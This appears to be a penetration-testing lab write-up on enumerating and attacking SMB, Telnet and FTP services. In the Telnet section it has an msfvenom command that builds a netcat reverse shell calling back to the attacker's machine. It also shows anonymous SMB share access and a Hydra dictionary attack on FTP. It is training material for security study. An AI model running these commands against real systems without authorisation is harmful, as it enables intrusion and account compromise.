# Network Services

# List of Contents
1. [SMB](#smb)
   1. [Enumerating SMB](#enumerating-smb)
   2. [Exploiting SMB](#exploiting-smb)
2. [Telnet](#telnet)
   1. [Enumerating Telnet](#enumerating-telnet)
   2. [Exploting Telnet](#exploiting-telnet)
3. [FTP](#ftp)
   1. [Exploiting FTP](#exploiting-ftp)

# SMB
SMB - Server Message Block Protocol - is a client-server communication protocol used for sharing access to files, printers, serial ports and other resources on a network

Servers make file systems and other resources (printers, named pipes, APIs) available to clients on the network. Client computers may have their own hard disks, but they also want access to the shared file systems and printers on the servers.

The SMB protocol is known as a response-request protocol, meaning that it transmits multiple messages between the client and server to establish a connection. Clients connect to servers using TCP/IP (actually NetBIOS over TCP/IP as specified in RFC1001 and RFC1002), NetBEUI or IPX/SPX.

Once they have established a connection, clients can then send commands (SMBs) to the server that allow them to access shares, open files, read and write files, and generally do all the sort of things that you want to do with a file system

**What runs SMB?**

Microsoft Windows operating systems since Windows 95 have included client and server SMB protocol support. Samba, an open source server that supports the SMB protocol, was released for Unix systems.

## Enumerating SMB

Enumeration is the process of gathering information on a target in order to find potential attack vectors and aid in exploitation.

This process is essential for an attack to be successful, as wasting time with exploits that either don't work or can crash the system can be a waste of energy. Enumeration can be used to gather usernames, passwords, network information, hostnames, application data, services, or any other information that may be valuable to an attacker.

Typically, there are SMB share drives on a server that can be connected to and used to view or transfer files. SMB can often be a great starting point for an attacker looking to discover sensitive information — you'd be surprised what is sometimes included on these shares.

You can go as in depth as you like on this, however I suggest using **nmap** with the **-A** and **-p-** tags.

- -A : Enables OS Detection, Version Detection, Script Scanning and Traceroute all in one
- -p- : Enables scanning across all ports, not just the top 1000

##  Exploiting SMB

While there are vulnerabilities such as CVE-2017-7494 that can allow remote code execution by exploiting SMB, you're more likely to encounter a situation where the best way into a system is due to misconfigurations in the system. In this case, we're going to be exploiting anonymous SMB share access- a common misconfiguration that can allow us to gain information that will lead to a shell.

**SMBClient**

Because we're trying to access an SMB share, we need a client to access resources on servers. We will be using SMBClient ****because it's part of the default samba suite. While it is available by default on Kali and Parrot, if you do need to install it, you can find the documentation [here.](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html)

We can remotely access the SMB share using the syntax:

`smbclient //[IP]/[SHARE]`

Followed by the tags:

- U [name] : to specify the user
- p [port] : to specify the port

What would be the correct syntax to access an SMB share called "secret" as user "suit" on a machine with the IP 10.10.10.2 on the default port?

smbclient [//10.10.10.2/secret](notion://10.10.10.2/secret) -U suit -p 139

Lets see if our interesting share has been configured to allow anonymous access, I.E it doesn't require authentication to view the files. We can do this easily by:

- using the username "Anonymous"
- connecting to the share we found during the enumeration stage
- and not supplying a password.

smbclient //$ip/profiles -U Anonymous

# Telnet

**What is Telnet?**

Telnet is an application protocol which allows you, with the use of a telnet client, to connect to and execute commands on a remote machine that's hosting a telnet server.

The telnet client will establish a connection with the server. The client will then become a virtual terminal- allowing you to interact with the remote host.

**Replacement**

Telnet sends all messages in clear text and has no specific security mechanisms. Thus, in many applications and services, Telnet has been replaced by SSH in most implementations

**How does Telnet work?**

The user connects to the server by using the Telnet protocol, which means entering **"telnet"** into a command prompt. The user then executes commands on the server by using specific Telnet commands in the Telnet prompt. You can connect to a telnet server with the following syntax: **"telnet [ip] [port]"**

## Enumerating Telnet

```yaml
nmap -p1-9999 <Machine_ip>
nmap <Machine_ip>
nmap -A -p <port> <Machine_ip>
```

## Exploiting Telnet

You can connect to a telnet server with the following syntax:

**"telnet [ip] [port]"**

**What is a Reverse Shell?**

A **"shell"** can simply be described as a piece of code or program which can be used to gain code or command execution on a device.

A reverse shell is a type of shell in which the target machine communicates back to the attacking machine.

The attacking machine has a listening port, on which it receives the connection, resulting in code or command execution being achieved.

We're going to generate a reverse shell payload using msfvenom.This will generate and encode a netcat reverse shell for us. Here's our syntax:

```bash
msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R
```

- `p` = payload
- `lhost` = our local host IP address (this is **your** machine's IP address)
- `lport` = the port to listen on (this is the port on **your** machine)
- `R` = export the payload in raw format

# FTP

**What is FTP?**

File Transfer Protocol (FTP) is, as the name suggests , a protocol used to allow remote transfer of files over a network. It uses a client-server model to do this, and- as we'll come on to later- relays commands and data in a very efficient way

**How does FTP work?**

A typical FTP session operates using two channels:

- a command (sometimes called the control) channel
- a data channel.

- As their names imply, the command channel is used for transmitting commands as well as replies to those commands, while the data channel is used for transferring data.
- FTP operates using a client-server protocol. The client initiates a connection with the server, the server validates whatever login credentials are provided and then opens the session.
- While the session is open, the client may execute FTP commands on the server.

**Active vs Passive**

The FTP server may support either Active or Passive connections, or both.

- In an Active FTP connection, the client opens a port and listens. The server is required to actively connect to it.
- In a Passive FTP connection, the server opens a port and listens (passively) and the client connects to it.

This separation of command information and data into separate channels is a way of being able to send commands to the server without having to wait for the current data transfer to finish. If both channels were interlinked, you could only enter commands in between data transfers, which wouldn't be efficient for either large file transfers, or slow internet connections.

## Exploiting FTP

**Hydra**

Hydra is a very fast online password cracking tool, which can perform rapid dictionary attacks against more than 50 Protocols, including Telnet, RDP, SSH, FTP, HTTP, HTTPS, SMB, several databases and much more. Hydra comes by default on both Parrot and Kali, however if you need it, you can find the GitHub [here](https://github.com/vanhauser-thc/thc-hydra).

The syntax for the command we're going to use to find the passwords is this:

```bash
hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp
```

Let's break it down:

| SECTION | FUNCTION |
|---|---|
| hydra | Runs the hydra tool |
| -t 4 | Number of parallel connections per target |
| -l [user] | Points to the user who's account you're trying to compromise |
| -P | [path to dictionary] Points to the file containing the list of possible passwords |
| -vV | Sets verbose mode to very verbose, shows the login+pass combination for each attempt |
| [machine IP] | The IP address of the target machine |
| ftp / protocol | Sets the protocol |

When inside, to see and open files, use `get <document> -`